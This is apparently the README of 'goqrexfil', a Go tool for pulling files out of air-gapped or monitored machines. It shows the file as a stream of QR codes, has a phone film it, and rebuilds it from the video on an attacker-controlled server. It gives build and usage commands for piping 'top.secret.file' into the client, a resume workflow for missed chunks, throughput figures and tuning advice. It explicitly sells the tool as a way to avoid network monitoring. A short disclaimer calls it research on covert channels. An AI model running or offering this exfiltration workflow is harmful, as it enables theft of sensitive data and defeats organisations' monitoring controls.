# goqrexfil

Exfiltrate data as **QR codes captured on video** — a cover channel that never touches the
network.

The idea: data leaves the air-gapped (or monitored) machine by being *looked at*. A client
displays the payload as a stream of QR codes; a phone records them on video; the video is
uploaded to a server you control, which extracts the frames, reads every QR code, and
reassembles the original file. No packets, no USB, no network monitoring alerts — just a
video file that looks like any other.

```
                 client (monitored machine)                          server (your machine)
                 ──────────────────────────                          ──────────────────────
  secret file ──► smaz compress ──► base64 ──► 320-byte chunks
                                                        │
                                          each chunk framed with a sequence number
                                                        │
                                              ┌─────────▼──────────┐
                                              │  QR code #1        │   ◄── phone records
                                              │  QR code #2        │       the window
                                              │  ...               │
                                              └─────────┬──────────┘
                                                        │  video upload (http)
                                                        ▼
                                    ffmpeg frame extraction ──► QR recognition (per frame)
                                                        │
                                          dedupe by sequence number, detect gaps
                                                        │
                                              base64 decode ──► smaz decompress
                                                        │
                                                        ▼
                                                 payload/payload.bin  ✓
```

## Requirements

* [Go](https://go.dev) 1.26+
* [ffmpeg](https://ffmpeg.org) on `PATH` (server mode only)
* A phone and a steady hand (client mode)
* Client mode uses [lorca](https://github.com/zserge/lorca) to open a browser window, so it
  needs Chrome/Chromium ≥ 70 installed

## Build

```sh
go build -o goqrexfil .
```

## Quick start

**1. Start the server** on a machine you control:

```sh
./goqrexfil --server
# Serving on port 9999
```

**2. Record the QR stream** on the monitored machine. Point your phone at the window that
opens (zoom so the QR fills most of the frame), start recording, wait for the stream, stop:

```sh
cat top.secret.file | ./goqrexfil --client
[*] Client mode: ON
[*] Loading payload from stdin
Plaintext hash 9f2c...
[*] Payload will be in 38 chunks
[***] Start your video, displaying in > 3 < seconds ****
```

**3. Upload the video** from your phone to `http://<server>:9999/` and submit. The server
responds with a download link:

```
[*] File received
[*] Retrieving chunk 1 from public/001.png
[*] Retrieving chunk 2 from public/006.png
...
[*] Received 38/38 chunks
[*] Payload saved as  ./payload/payload.bin
Payload hash 9f2c...
```

Compare the `Plaintext hash` from step 2 with the `Payload hash` from step 3 — they must
match. Then download the file from `http://<server>:9999/payload`.

## Reliability: gaps and resume

Every QR code carries a sequence number (`GQ1:<seq>:` header), so the server reassembles
chunks **in order**, dedupes repeated frames by index, and — if the video missed a frame —
tells you exactly what is missing instead of silently producing a corrupt file:

```
[*] Received 29/38 chunks - MISSING: 4,8,12,16,20,24,28,32,36
```

The upload page (and the `GET /missing` endpoint) then gives you the chunk numbers to
re-record. Re-run the client with `--resume` to display **only** those chunks, record a
second short video, and upload it again:

```sh
cat top.secret.file | ./goqrexfil --client --resume 4,8,12,16,20,24,28,32,36
```

## Self-test (no camera needed)

Verify the whole encode → QR → decode → reassemble pipeline locally, e.g. after changing
chunk size or QR settings:

```sh
cat top.secret.file | ./goqrexfil --selftest
[*] Self-test mode: local QR round-trip, no camera needed
[*] Payload will be in 38 chunks
[*] PASS: round-trip OK, payload hash 9f2c...
```

The repo also ships end-to-end tests (`goqrexfil_test.go`) that build a real mp4 from QR
frames and run the full server pipeline, including a dropped-frame scenario:

```sh
go test ./...
```

## Reference

### Flags

| Flag | Description |
| --- | --- |
| `--client` | Read payload from stdin, display QR stream in a browser window |
| `--client --resume 3,7,12` | Display only the given 1-based chunk numbers (re-record gaps) |
| `--server` | Web server on port 9999: upload video, extract payload |
| `--selftest` | Local round-trip test of the QR pipeline, no camera needed |
| `--retrievePayload` | Re-process `./public/video.mp4` without the web server (debug) |

### Server endpoints

| Endpoint | Description |
| --- | --- |
| `GET /` | Upload form |
| `POST /upload` | Upload the video (multipart field `file`, max 512 MB); returns download link or missing-chunk list |
| `GET /payload` | Download the reassembled payload |
| `GET /missing` | 1-based chunk numbers to re-record, formatted for `--resume` |
| `GET /process/` | Static access to extracted frames (debugging) |

### The chunk protocol

Each QR code encodes `GQ1:<seq>:<data>` where `<seq>` is a zero-padded 6-digit sequence
number and `<data>` is a ≤320-byte slice of the base64-encoded, smaz-compressed payload.
The `:` separator cannot appear in base64, so framing is unambiguous.

## Throughput

Each QR code carries 320 bytes of base64 (≈240 bytes of compressed data) and is held for
550 ms, so the raw channel runs at roughly **436 compressed bytes/second** (~3.5 kbit/s).
Base64 inflates the payload by 4/3, so the table below is the **worst case** (incompressible
data like random or encrypted bytes, where smaz can't shrink it):

| Original size | Chunks | Recording time |
| --- | --- | --- |
| 1 KB | 5 | ~3 s |
| 10 KB | 43 | ~25 s |
| 100 KB | 427 | ~4 min |
| 1 MB | 4,370 | ~40 min |
| 10 MB | 43,691 | ~6.7 h |

Compressible payloads (text, PDFs, source) shrink under smaz and transfer proportionally
faster. If a recording misses frames, the resume workflow above recovers the gaps without
re-recording everything.

## Tuning

Constants at the top of `goqrexfil.go`:

* `QRCDataMaxBytes` — bytes per QR (320). Higher = fewer chunks but denser, harder-to-scan
  codes. Run `--selftest` after changing it.
* `msBetweenFrames` — dwell time per QR (550 ms). Raise it if your phone drops frames.
* `ffmpegImageScale` — frames are extracted at native resolution, capped at 1600 px wide
  for 4K video. Never downscale below ~600 px: QR recognition fails below that.

## Limitations

* The server is plain HTTP with no authentication — run it on a trusted network or behind
  a tunnel, and stop it when done.
* Recognition quality depends on the recording: steady hand, good lighting, QR filling the
  frame. The gap/resume workflow exists precisely because some frames will be lost.
* This is a research/education project about cover channels. Use it only on systems you own
  or are authorized to test.

## License

See [LICENSE](LICENSE).
